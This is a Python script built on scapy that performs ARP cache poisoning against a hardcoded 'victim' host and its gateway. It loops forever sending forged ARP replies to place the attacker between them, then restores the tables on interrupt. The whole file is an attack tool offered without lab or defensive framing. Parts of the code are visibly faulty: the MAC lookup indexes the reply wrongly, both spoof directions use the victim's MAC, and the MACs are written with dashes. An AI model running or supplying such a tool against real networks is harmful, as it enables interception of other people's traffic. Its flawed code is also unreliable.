from scapy.all import *

import scapy.all as scapy
import time
import argparse
import sys

destinationMac = 'CC-B0-DA-AA-0B-D5' #is Mac address of victim machine
targetIP = '172.16.7.153' #is Ip address of victim machine
gatewayIP = '172.16.255.254' #is gatewayIP
sourceMAC = '34-C9-3D-18-2E-EB' #

def getMac(destinationIP):
    p = sr1(scapy.ARP(op=scapy.ARP.who_has, psrc="192.168.5.51", pdst=destinationIP))
    return p[scapy.hwsrc]

def spoofer(targetIP, spoofIP):
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
    scapy.send(packet, verbose=False)

def restore(destinationIP, sourceIP):
    packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=getMac(destinationIP), psrc=sourceIP, hwsrc=sourceMAC)
    scapy.send(packet, count=4, verbose=False)


packets = 0
try:
    while True:
        spoofer(targetIP, gatewayIP)
        spoofer(gatewayIP, targetIP)
        print("\r[+] Sent packets " + str(packets)),
        sys.stdout.flush()
        packets += 2
        time.sleep(2)
except KeyboardInterrupt:
    print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
    restore(targetIP, gatewayIP)
    restore(gatewayIP, targetIP)
